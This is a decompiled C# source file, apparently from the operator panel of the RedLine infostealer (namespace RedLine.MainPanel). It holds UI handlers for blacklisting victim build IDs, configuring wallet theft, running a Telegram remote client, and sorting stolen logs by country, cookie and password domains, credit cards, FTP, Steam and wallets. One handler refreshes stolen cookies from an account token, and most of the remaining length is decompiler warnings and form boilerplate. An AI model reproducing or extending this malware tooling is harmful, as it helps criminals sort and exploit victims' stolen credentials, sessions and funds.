				OpenFileDialog ofd = new OpenFileDialog();
				try
				{
					ofd.Filter = "Txt files (*.txt)|*.txt";
					ofd.CheckPathExists = true;
					ofd.InitialDirectory = Directory.GetCurrentDirectory();
					ofd.RestoreDirectory = true;
					ofd.Multiselect = false;
					Invoke((MethodInvoker)delegate
					{
						if (ofd.ShowDialog(this) == DialogResult.OK)
						{
							string[] array = System.IO.File.ReadAllLines(ofd.FileName);
							foreach (string item in array)
							{
								((ListBox)blackListLb).Items.Add(item);
							}
						}
					});
				}
				finally
				{
					if (ofd != null)
					{
						((IDisposable)ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private void blackListCms_7_Opening(object sender, object e)
	{
		((CancelEventArgs)e).Cancel = ((ListBox)blackListBuildsLb).SelectedItems.Count == 0;
	}

	private void toolStripMenuItem9_Click(object sender, object e)
	{
		((ListBox)blackListBuildsLb).Items.RemoveAt(((ListControl)blackListBuildsLb).SelectedIndex);
	}

	private async void importBuilds_Click(object sender, object e)
	{
		await Task.Factory.StartNew(delegate
		{
			try
			{
				OpenFileDialog ofd = new OpenFileDialog();
				try
				{
					ofd.Filter = "Txt files (*.txt)|*.txt";
					ofd.CheckPathExists = true;
					ofd.InitialDirectory = Directory.GetCurrentDirectory();
					ofd.RestoreDirectory = true;
					ofd.Multiselect = false;
					Invoke((MethodInvoker)delegate
					{
						if (ofd.ShowDialog(this) == DialogResult.OK)
						{
							string[] array = System.IO.File.ReadAllLines(ofd.FileName);
							foreach (string item in array)
							{
								((ListBox)blackListBuildsLb).Items.Add(item);
							}
						}
					});
				}
				finally
				{
					if (ofd != null)
					{
						((IDisposable)ofd).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
	}

	private void addBlackBuildBtn_Click(object sender, object e)
	{
		if (string.IsNullOrWhiteSpace(((AnimaTextBox)blackBuildIdTb).Text))
		{
			MessageBox.Show(this, "Please enter a build id");
			return;
		}
		((ListBox)blackListBuildsLb).Items.Add(((AnimaTextBox)blackBuildIdTb).Text);
		((AnimaTextBox)blackBuildIdTb).Text = string.Empty;
	}

	private async void autoStartTelegramCb_CheckedChanged(object sender, object e)
	{
		try
		{
			lock (settingsLock)
			{
				RemoteClientSettings.AutoStart = ((MetroSetCheckBox)autoStartTelegramCb).Checked;
				RemoteClientSettings.SaveSettings();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private async void metroSetButton4_Click(object sender, object e)
	{
		try
		{
			if (new WalletsConfigurator().ShowDialog(this) == DialogResult.OK)
			{
				MessageBox.Show(this, "Successfully configurated");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.ToString());
		}
	}

	private async void saveConfigBtn_Click(object sender, object e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Sorter config files (*.scfg)|*.scfg";
			saveFileDialog.DefaultExt = ".scfg";
			saveFileDialog.CheckPathExists = true;
			saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
			saveFileDialog.RestoreDirectory = true;
			if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
			{
				SingleSearchParams singleSearchParams = new SingleSearchParams
				{
					SetComment = ((AnimaTextBox)e9).Text,
					SkipComment = ((AnimaTextBox)e7).Text,
					BuildID = ((AnimaTextBox)singleIdSortTb).Text,
					Comment = ((AnimaTextBox)singleCommentSortTb).Text,
					OS = ((AnimaTextBox)singleOsSortTb).Text,
					Country = ((AnimaTextBox)singleCountrySortTb).Text,
					ContainsAFs = ((MetroSetCheckBox)singleAfSortCb).Checked,
					ContainsCCs = ((MetroSetCheckBox)singleCCsSortCb).Checked,
					ContainsFiles = ((MetroSetCheckBox)singleFilesSortCb).Checked,
					ContainsFTPs = ((MetroSetCheckBox)singleFtpsSortCb).Checked,
					CookieDomain = ((AnimaTextBox)singleCookieSortTb).Text,
					PasswordDomain = ((AnimaTextBox)singlePasswordSortTb).Text,
					ContainsWallets = ((MetroSetCheckBox)c6).Checked,
					SkipCookies = ((MetroSetCheckBox)fa).Checked,
					SkipPasswords = ((MetroSetCheckBox)f8).Checked,
					RefreshDD = ((MetroSetCheckBox)singleRefreshDomainDetectSortCb).Checked,
					SkipChecked = ((MetroSetCheckBox)singleSkipCheckedSortCb).Checked,
					FilesToSearch = ((AnimaTextBox)fileNamesToSearchTb).Text,
					ContainsSteam = ((MetroSetCheckBox)steamFilesCb).Checked,
					ContainsTelegram = ((MetroSetCheckBox)findTgCb).Checked,
					PasswordsMoreThan = (int)((NumericUpDown)passMoreThan).Value,
					CookiesMoreThan = (int)((NumericUpDown)cookiesMoreThan).Value
				};
				singleSearchParams.LogFrom = ((DateTimePicker)logDateFromDTP).Value;
				singleSearchParams.LogTo = ((DateTimePicker)logDateToDTP).Value;
				System.IO.File.WriteAllText(saveFileDialog.FileName, singleSearchParams.ToJSON());
				MessageBox.Show(this, "Saved to file '" + saveFileDialog.FileName + "'");
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private async void loadConfigBtn_Click(object sender, object e)
	{
		try
		{
			new SingleSearchParams();
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Sorter config files (*.scfg)|*.scfg";
			openFileDialog.CheckPathExists = true;
			openFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
			openFileDialog.RestoreDirectory = true;
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog(this) == DialogResult.OK)
			{
				SingleSearchParams singleSearchParams = System.IO.File.ReadAllText(openFileDialog.FileName).FromJSON<SingleSearchParams>();
				((AnimaTextBox)e9).Text = singleSearchParams.SetComment;
				((AnimaTextBox)e7).Text = singleSearchParams.SkipComment;
				((AnimaTextBox)singleIdSortTb).Text = singleSearchParams.BuildID;
				((AnimaTextBox)singleCommentSortTb).Text = singleSearchParams.Comment;
				((AnimaTextBox)singleOsSortTb).Text = singleSearchParams.OS;
				((AnimaTextBox)singleCountrySortTb).Text = singleSearchParams.Country;
				((MetroSetCheckBox)singleAfSortCb).Checked = singleSearchParams.ContainsAFs;
				((MetroSetCheckBox)singleCCsSortCb).Checked = singleSearchParams.ContainsCCs;
				((MetroSetCheckBox)singleFilesSortCb).Checked = singleSearchParams.ContainsFiles;
				((MetroSetCheckBox)singleFtpsSortCb).Checked = singleSearchParams.ContainsFTPs;
				((AnimaTextBox)singleCookieSortTb).Text = singleSearchParams.CookieDomain;
				((AnimaTextBox)singlePasswordSortTb).Text = singleSearchParams.PasswordDomain;
				((MetroSetCheckBox)c6).Checked = singleSearchParams.ContainsWallets;
				((MetroSetCheckBox)fa).Checked = singleSearchParams.SkipCookies;
				((MetroSetCheckBox)f8).Checked = singleSearchParams.SkipPasswords;
				((MetroSetCheckBox)singleRefreshDomainDetectSortCb).Checked = singleSearchParams.RefreshDD;
				((MetroSetCheckBox)singleSkipCheckedSortCb).Checked = singleSearchParams.SkipChecked;
				((AnimaTextBox)fileNamesToSearchTb).Text = singleSearchParams.FilesToSearch;
				((MetroSetCheckBox)steamFilesCb).Checked = singleSearchParams.ContainsSteam;
				((MetroSetCheckBox)findTgCb).Checked = singleSearchParams.ContainsTelegram;
				((NumericUpDown)passMoreThan).Value = singleSearchParams.PasswordsMoreThan;
				((NumericUpDown)cookiesMoreThan).Value = singleSearchParams.CookiesMoreThan;
				((DateTimePicker)logDateFromDTP).Value = singleSearchParams.LogFrom;
				((DateTimePicker)logDateToDTP).Value = singleSearchParams.LogTo;
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, "Error: " + ex.Message);
		}
	}

	private async void refreshCookiesBtn_Click(object sender, object e)
	{
		((MetroSetButton)refreshCookiesBtn).Enabled = false;
		((Control)refreshCookiesBtn).Text = "Processing..";
		string accountToken = ((AnimaTextBox)accessTokenTb).Text;
		if (string.IsNullOrWhiteSpace(accountToken))
		{
			((Control)refreshCookiesBtn).Text = "Refresh";
			((MetroSetButton)refreshCookiesBtn).Enabled = true;
			MessageBox.Show(this, "Please, enter an account token.");
			return;
		}
		await Task.Factory.StartNew(delegate
		{
			try
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Title = "Enter file name to save cookies";
				saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
				saveFileDialog.DefaultExt = ".txt";
				saveFileDialog.CheckPathExists = true;
				saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
				saveFileDialog.RestoreDirectory = true;
				if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
				{
					List<RedLine.SharedModels.Cookie> list = CookieHelper.Refresh(accountToken);
					if (list.Count <= 0)
					{
						MessageBox.Show(this, "Can't refresh cookies..Ooops...Token is invalid");
					}
					else
					{
						string cookies = (RemoteClientSettings.SaveAsJSON ? list.CookiesToJSON() : string.Join(Environment.NewLine, list.Select((RedLine.SharedModels.Cookie x) => x.ToText())));
						System.IO.File.WriteAllText(saveFileDialog.FileName, cookies);
						Invoke((MethodInvoker)delegate
						{
							((AnimaTextBox)freshCookiesTb).Text = cookies;
						});
						MessageBox.Show(this, "Cookies are refreshed and saved to " + saveFileDialog.FileName);
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(this, "Error: " + ex.Message);
			}
		});
		((Control)refreshCookiesBtn).Text = "Refresh";
		((MetroSetButton)refreshCookiesBtn).Enabled = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_9 != null)
		{
			((IDisposable)object_9).Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_01f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0201: Expected O, but got Unknown
		//IL_0293: Unknown result type (might be due to invalid IL or missing references)
		//IL_029d: Expected O, but got Unknown
		//IL_0344: Unknown result type (might be due to invalid IL or missing references)
		//IL_034e: Expected O, but got Unknown
		//IL_034f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0359: Expected O, but got Unknown
		//IL_035a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0364: Expected O, but got Unknown
		//IL_0365: Unknown result type (might be due to invalid IL or missing references)
		//IL_036f: Expected O, but got Unknown
		//IL_0370: Unknown result type (might be due to invalid IL or missing references)
		//IL_037a: Expected O, but got Unknown
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0385: Expected O, but got Unknown
		//IL_0391: Unknown result type (might be due to invalid IL or missing references)
		//IL_039b: Expected O, but got Unknown
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a6: Expected O, but got Unknown
		//IL_03a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b1: Expected O, but got Unknown
		//IL_03b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bc: Expected O, but got Unknown
		//IL_04d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e0: Expected O, but got Unknown
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f6: Expected O, but got Unknown
		//IL_04f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0501: Expected O, but got Unknown
		//IL_0502: Unknown result type (might be due to invalid IL or missing references)
		//IL_050c: Expected O, but got Unknown
		//IL_050d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0517: Expected O, but got Unknown
		//IL_0518: Unknown result type (might be due to invalid IL or missing references)
		//IL_0522: Expected O, but got Unknown
		//IL_052e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0538: Expected O, but got Unknown
		//IL_0539: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Expected O, but got Unknown
		//IL_0565: Unknown result type (might be due to invalid IL or missing references)
		//IL_056f: Expected O, but got Unknown
		//IL_057b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0585: Expected O, but got Unknown
		//IL_05b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_05bc: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05dd: Expected O, but got Unknown
		//IL_05f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fe: Expected O, but got Unknown
		//IL_0615: Unknown result type (might be due to invalid IL or missing references)
		//IL_061f: Expected O, but got Unknown
		//IL_0636: Unknown result type (might be due to invalid IL or missing references)
		//IL_0640: Expected O, but got Unknown
		//IL_06a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06ae: Expected O, but got Unknown
		//IL_0702: Unknown result type (might be due to invalid IL or missing references)
		//IL_070c: Expected O, but got Unknown
		//IL_070d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0717: Expected O, but got Unknown
		//IL_0723: Unknown result type (might be due to invalid IL or missing references)
		//IL_072d: Expected O, but got Unknown
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0796: Expected O, but got Unknown
		//IL_0797: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a1: Expected O, but got Unknown
		//IL_07a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ac: Expected O, but got Unknown
		//IL_07ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b7: Expected O, but got Unknown
		//IL_07d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e3: Expected O, but got Unknown
		//IL_07e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ee: Expected O, but got Unknown
		//IL_07ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f9: Expected O, but got Unknown
		//IL_0810: Unknown result type (might be due to invalid IL or missing references)
		//IL_081a: Expected O, but got Unknown
		//IL_081b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0825: Expected O, but got Unknown
		//IL_0826: Unknown result type (might be due to invalid IL or missing references)
		//IL_0830: Expected O, but got Unknown
		//IL_0831: Unknown result type (might be due to invalid IL or missing references)
		//IL_083b: Expected O, but got Unknown
		//IL_083c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0846: Expected O, but got Unknown
		//IL_0847: Unknown result type (might be due to invalid IL or missing references)
		//IL_0851: Expected O, but got Unknown
		//IL_0852: Unknown result type (might be due to invalid IL or missing references)
		//IL_085c: Expected O, but got Unknown
		//IL_085d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0867: Expected O, but got Unknown
		//IL_0868: Unknown result type (might be due to invalid IL or missing references)
		//IL_0872: Expected O, but got Unknown
		//IL_087e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0888: Expected O, but got Unknown
		//IL_0889: Unknown result type (might be due to invalid IL or missing references)
		//IL_0893: Expected O, but got Unknown
		//IL_0894: Unknown result type (might be due to invalid IL or missing references)
		//IL_089e: Expected O, but got Unknown
		//IL_089f: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a9: Expected O, but got Unknown
		//IL_08b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_08bf: Expected O, but got Unknown
		//IL_08c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ca: Expected O, but got Unknown
		//IL_094a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0954: Expected O, but got Unknown
		//IL_0955: Unknown result type (might be due to invalid IL or missing references)
		//IL_095f: Expected O, but got Unknown
		//IL_098c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0996: Expected O, but got Unknown
		//IL_0997: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a1: Expected O, but got Unknown
		//IL_09ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_09b7: Expected O, but got Unknown
		//IL_09c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cd: Expected O, but got Unknown
		//IL_09d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09e3: Expected O, but got Unknown
		//IL_09ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Expected O, but got Unknown
		//IL_09fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a04: Expected O, but got Unknown
		//IL_0a05: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0f: Expected O, but got Unknown
		//IL_0a26: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a30: Expected O, but got Unknown
		//IL_0a3c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a46: Expected O, but got Unknown
		//IL_0a52: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a5c: Expected O, but got Unknown
		//IL_0a68: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a72: Expected O, but got Unknown
		//IL_0a7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a88: Expected O, but got Unknown
		//IL_0a89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a93: Expected O, but got Unknown
		//IL_0a94: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a9e: Expected O, but got Unknown
		//IL_0a9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa9: Expected O, but got Unknown
		//IL_0aaa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab4: Expected O, but got Unknown
		//IL_0ab5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0abf: Expected O, but got Unknown
		//IL_0ac0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aca: Expected O, but got Unknown
		//IL_0acb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ad5: Expected O, but got Unknown
		//IL_0ae1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aeb: Expected O, but got Unknown
		//IL_0b0d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b17: Expected O, but got Unknown
		//IL_0b23: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b2d: Expected O, but got Unknown
		//IL_0b2e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b38: Expected O, but got Unknown
		//IL_0b39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b43: Expected O, but got Unknown
		//IL_0b44: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4e: Expected O, but got Unknown
		//IL_0b4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b59: Expected O, but got Unknown
		//IL_0b5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b64: Expected O, but got Unknown
		//IL_0b65: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b6f: Expected O, but got Unknown
		//IL_0b7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b85: Expected O, but got Unknown
		//IL_0b91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9b: Expected O, but got Unknown
		//IL_0ba7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bb1: Expected O, but got Unknown
		//IL_0bbd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc7: Expected O, but got Unknown
		//IL_0bd3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bdd: Expected O, but got Unknown
		//IL_0bde: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be8: Expected O, but got Unknown
		//IL_0be9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf3: Expected O, but got Unknown
		//IL_0bff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c09: Expected O, but got Unknown
		//IL_0c0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c14: Expected O, but got Unknown
		//IL_0c20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c2a: Expected O, but got Unknown
		//IL_0c36: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c40: Expected O, but got Unknown
		//IL_0c57: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c61: Expected O, but got Unknown
		//IL_0c62: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6c: Expected O, but got Unknown
		//IL_0c78: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c82: Expected O, but got Unknown
		//IL_0c83: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c8d: Expected O, but got Unknown
		//IL_0ca4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cae: Expected O, but got Unknown
		//IL_0cba: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc4: Expected O, but got Unknown
		//IL_0cd0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cda: Expected O, but got Unknown
		//IL_0ce6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf0: Expected O, but got Unknown
		//IL_0cf1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cfb: Expected O, but got Unknown
		//IL_0cfc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d06: Expected O, but got Unknown
		//IL_0d12: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d1c: Expected O, but got Unknown
		//IL_0d28: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d32: Expected O, but got Unknown
		//IL_0d33: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d3d: Expected O, but got Unknown
		//IL_0d3e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d48: Expected O, but got Unknown
		//IL_0d5f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d69: Expected O, but got Unknown
		//IL_0d6a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d74: Expected O, but got Unknown
		//IL_0d75: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d7f: Expected O, but got Unknown
		//IL_0d8b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d95: Expected O, but got Unknown
		//IL_0d96: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da0: Expected O, but got Unknown
		//IL_0dac: Unknown result type (might be due to invalid IL or missing references)
		//IL_0db6: Expected O, but got Unknown
		//IL_0db7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dc1: Expected O, but got Unknown
		//IL_0dc2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dcc: Expected O, but got Unknown
		//IL_0dd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0de2: Expected O, but got Unknown
		//IL_0de3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ded: Expected O, but got Unknown
		//IL_0df9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e03: Expected O, but got Unknown
		//IL_0e04: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e0e: Expected O, but got Unknown
		//IL_0e1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e24: Expected O, but got Unknown
		//IL_0e30: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e3a: Expected O, but got Unknown
		//IL_0e3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e45: Expected O, but got Unknown
		//IL_0e46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e50: Expected O, but got Unknown
		//IL_0e5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e66: Expected O, but got Unknown
		//IL_0e67: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e71: Expected O, but got Unknown
		//IL_0e88: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e92: Expected O, but got Unknown
		//IL_0e9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea8: Expected O, but got Unknown
		//IL_0ea9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eb3: Expected O, but got Unknown
		//IL_0eca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ed4: Expected O, but got Unknown
		//IL_0ed5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0edf: Expected O, but got Unknown
		//IL_0ee0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eea: Expected O, but got Unknown
		//IL_0f01: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0b: Expected O, but got Unknown
		//IL_0f0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f16: Expected O, but got Unknown
		//IL_0f17: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f21: Expected O, but got Unknown
		//IL_0f22: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f2c: Expected O, but got Unknown
		//IL_0f59: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f63: Expected O, but got Unknown
		//IL_0f64: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f6e: Expected O, but got Unknown
		//IL_0f6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f79: Expected O, but got Unknown
		//IL_0f9b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa5: Expected O, but got Unknown
		//IL_0fa6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb0: Expected O, but got Unknown
		//IL_0fb1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fbb: Expected O, but got Unknown
		//IL_0fbc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc6: Expected O, but got Unknown
		//IL_0fc7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fd1: Expected O, but got Unknown
		//IL_0fd2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fdc: Expected O, but got Unknown
		//IL_0ffe: Unknown result type (might be due to invalid IL or missing references)
		//IL_1008: Expected O, but got Unknown
		//IL_1009: Unknown result type (might be due to invalid IL or missing references)
		//IL_1013: Expected O, but got Unknown
		//IL_1014: Unknown result type (might be due to invalid IL or missing references)
		//IL_101e: Expected O, but got Unknown
		//IL_1040: Unknown result type (might be due to invalid IL or missing references)
		//IL_104a: Expected O, but got Unknown
		//IL_104b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1055: Expected O, but got Unknown
		//IL_1082: Unknown result type (might be due to invalid IL or missing references)
		//IL_108c: Expected O, but got Unknown
		//IL_1098: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a2: Expected O, but got Unknown
		//IL_10a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ad: Expected O, but got Unknown
		//IL_10ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b8: Expected O, but got Unknown
		//IL_10cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_10d9: Expected O, but got Unknown
		//IL_10e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_10ef: Expected O, but got Unknown
		//IL_10fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1105: Expected O, but got Unknown
		//IL_1111: Unknown result type (might be due to invalid IL or missing references)
		//IL_111b: Expected O, but got Unknown
		//IL_1127: Unknown result type (might be due to invalid IL or missing references)
		//IL_1131: Expected O, but got Unknown
		//IL_1132: Unknown result type (might be due to invalid IL or missing references)
		//IL_113c: Expected O, but got Unknown
		//IL_113d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1147: Expected O, but got Unknown
		//IL_1148: Unknown result type (might be due to invalid IL or missing references)
		//IL_1152: Expected O, but got Unknown
		//IL_1174: Unknown result type (might be due to invalid IL or missing references)
		//IL_117e: Expected O, but got Unknown
		//IL_118a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1194: Expected O, but got Unknown
		//IL_11a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_11aa: Expected O, but got Unknown
		//IL_11b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_11c0: Expected O, but got Unknown
		//IL_11c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_11cb: Expected O, but got Unknown
		//IL_11cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d6: Expected O, but got Unknown
		//IL_11d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_11e1: Expected O, but got Unknown
		//IL_11e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ec: Expected O, but got Unknown
		//IL_1219: Unknown result type (might be due to invalid IL or missing references)
		//IL_1223: Expected O, but got Unknown
		//IL_122f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1239: Expected O, but got Unknown
		//IL_1245: Unknown result type (might be due to invalid IL or missing references)
		//IL_124f: Expected O, but got Unknown
		//IL_125b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1265: Expected O, but got Unknown
		//IL_1287: Unknown result type (might be due to invalid IL or missing references)
		//IL_1291: Expected O, but got Unknown
		//IL_12a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_12b2: Expected O, but got Unknown
		//IL_130d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1317: Expected O, but got Unknown
		//IL_1318: Unknown result type (might be due to invalid IL or missing references)
		//IL_1322: Expected O, but got Unknown
		//IL_1323: Unknown result type (might be due to invalid IL or missing references)
		//IL_132d: Expected O, but got Unknown
		this.object_9 = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RedLine.MainPanel.Views.Old.Actions.MainFrm));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
